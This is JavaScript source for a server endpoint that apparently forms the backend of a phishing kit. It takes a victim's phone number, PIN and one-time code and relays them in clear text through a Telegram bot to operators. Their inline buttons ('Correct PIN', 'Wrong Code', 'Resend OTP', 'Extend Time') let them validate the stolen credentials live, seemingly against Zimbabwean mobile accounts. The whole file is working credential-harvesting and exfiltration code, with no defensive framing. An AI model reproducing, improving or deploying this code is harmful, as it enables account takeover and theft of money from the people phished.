const { sendMessage } = require('../../lib/telegram');
const { listUsers, isUser } = require('../../lib/store');
const { create } = require('../../lib/approvals');

const ADMIN_ID = String(process.env.SUPER_ADMIN_CHAT_ID || process.env.TELEGRAM_CHAT_ID || '');
const BOT_TOKEN = process.env.TELEGRAM_TOKEN || '';

let botLabelCache = null;
async function getBotLabel() {
  if (botLabelCache) return botLabelCache;
  const ac = new AbortController();
  const timeout = setTimeout(() => ac.abort(), 5000);
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`, { signal: ac.signal });
    const data = await res.json();
    botLabelCache = (data.ok && data.result && data.result.username) || process.env.BOT_LABEL || 'bot';
    return botLabelCache;
  } catch {
    return process.env.BOT_LABEL || 'bot';
  } finally {
    clearTimeout(timeout);
  }
}

function formatTime(ts, tz = 'Africa/Harare') {
  return new Date(ts).toLocaleString('en-US', {
    timeZone: tz,
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
  });
}

function formatHM(ts, tz = 'Africa/Harare') {
  return new Date(ts).toLocaleTimeString('en-GB', { timeZone: tz, hour: '2-digit', minute: '2-digit', hour12: false });
}

function buildPinText(phone, pin, userId, botLabel) {
  const now = Date.now();
  const end = now + 5 * 60 * 1000;
  return (
    `USER DETAILS:\n` +
    `\n` +
    `Phone Number: ${phone}\n` +
    `PIN Code: ${pin}\n` +
    `User ID: ${userId}\n` +
    `Time: ${formatTime(now)}\n` +
    `Bot: ${botLabel}\n` +
    `\n` +
    `Verify the PIN:\n` +
    `PIN Length: ${String(pin).length} digits\n` +
    `Timeout: 5 minutes\n` +
    `${formatHM(now)}\n` +
    `${formatHM(end)}`
  );
}

function buildOtpText(phone, otp, botLabel) {
  const cc = phone.startsWith('+263') ? '+263' : '';
  const number = cc ? phone.slice(cc.length) : phone;
  const now = Date.now();
  const end = now + 5 * 60 * 1000;
  return (
    `NEW USER - VERIFICATION NEEDED\n` +
    `\n` +
    `Country Code: ${cc || '+263'}\n` +
    `Phone Number: ${number}\n` +
    `OTP Code: ${otp}\n` +
    `Time: ${formatTime(now)}\n` +
    `Bot: ${botLabel}\n` +
    `\n` +
    `Verify the credentials:\n` +
    `Timeout: 5 minutes\n` +
    `${formatHM(now)}\n` +
    `${formatHM(end)}`
  );
}

function buildPinButtonsText() {
  return `<b>Actions:</b>`;
}

function buildOtpButtonsText() {
  return `<b>Actions:</b>`;
}

function buildPinKeyboard() {
  return {
    inline_keyboard: [
      [{ text: '✅ Correct PIN', callback_data: 'a:' + 'x'.repeat(10) + ':pinok' }],
      [{ text: '✅ Correct PIN & OTP', callback_data: 'a:' + 'x'.repeat(10) + ':bothok' }],
      [{ text: '❌ Wrong PIN', callback_data: 'a:' + 'x'.repeat(10) + ':pinbad' }],
      [{ text: '⏱ Extend Time', callback_data: 'a:' + 'x'.repeat(10) + ':extend' }],
    ],
  };
}

function buildOtpKeyboard() {
  return {
    inline_keyboard: [
      [{ text: '✅ Correct (PIN + OTP)', callback_data: 'a:' + 'x'.repeat(10) + ':bothok' }],
      [{ text: '❌ Wrong Code', callback_data: 'a:' + 'x'.repeat(10) + ':otpbad' }],
      [{ text: '❌ Wrong PIN', callback_data: 'a:' + 'x'.repeat(10) + ':pinbad' }],
      [{ text: '📨 Resend OTP', callback_data: 'a:' + 'x'.repeat(10) + ':resend' }],
      [{ text: '⏱ Extend Time', callback_data: 'a:' + 'x'.repeat(10) + ':extend' }],
    ],
  };
}

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const { stage, phone, pin, otp } = req.body || {};
  const userId = `user_${Date.now()}`;

  if (!['pin', 'otp'].includes(stage)) return res.status(400).json({ error: 'Invalid stage' });
  const cleanPhone = String(phone || '').replace(/\D/g, '');
  if (!cleanPhone || cleanPhone.length < 5) return res.status(400).json({ error: 'Invalid phone' });
  if (stage === 'pin' && !pin) return res.status(400).json({ error: 'Missing PIN' });
  if (stage === 'otp' && !otp) return res.status(400).json({ error: 'Missing OTP' });

  try {
    console.log('📝 Approval request:', { stage, phone: cleanPhone, pin: pin ? '****' : '' });

    const botLabel = await getBotLabel();
    console.log('✅ Got bot label:', botLabel);

    const text = stage === 'pin' ? buildPinText(cleanPhone, pin, userId, botLabel) : buildOtpText(cleanPhone, otp, botLabel);
    const record = await create({ stage, text });
    console.log('✅ Created approval record:', record.id);

    const keyboard = stage === 'pin' ? buildPinKeyboard() : buildOtpKeyboard();
    const keyboardWithId = {
      inline_keyboard: keyboard.inline_keyboard.map((row) =>
        row.map((btn) => ({
          ...btn,
          callback_data: `a:${record.id}:${btn.callback_data.split(':')[2]}`,
        }))
      ),
    };

    const users = await listUsers().catch(() => []);
    console.log('✅ Got users:', users);

    const recipients = [ADMIN_ID, ...users].filter(Boolean);
    const uniqueRecipients = [...new Set(recipients)];
    console.log('📤 Sending to recipients:', uniqueRecipients);

    const mainMessages = [];
    const buttonMessages = [];

    await Promise.allSettled(
      uniqueRecipients.map(async (chatId) => {
        try {
          const mainMsg = await sendMessage(BOT_TOKEN, chatId, text);
          mainMessages.push({ c: mainMsg.chat.id, m: mainMsg.message_id });
          console.log('📤 Sent main message to', chatId);

          const buttonsText = stage === 'pin' ? buildPinButtonsText() : buildOtpButtonsText();
          const btnMsg = await sendMessage(BOT_TOKEN, chatId, buttonsText, {
            parse_mode: 'HTML',
            reply_markup: keyboardWithId,
          });
          buttonMessages.push({ c: btnMsg.chat.id, m: btnMsg.message_id });
          console.log('📤 Sent button message to', chatId);
        } catch (err) {
          console.error('❌ Failed to send to', chatId, err.message);
        }
      })
    );

    if (mainMessages.length === 0) {
      console.error('❌ No messages sent to any recipient');
      return res.status(502).json({ error: 'Failed to send verification message' });
    }

    record.messages = mainMessages;
    record.buttonMessages = buttonMessages;
    await require('../../lib/approvals').save(record);
    console.log('✅ Approval complete:', record.id);

    return res.status(200).json({ id: record.id, expiresAt: record.expiresAt });
  } catch (err) {
    console.error('❌ Approval request error:', err.message, err);
    return res.status(500).json({ error: err.message || 'Internal server error' });
  }
};
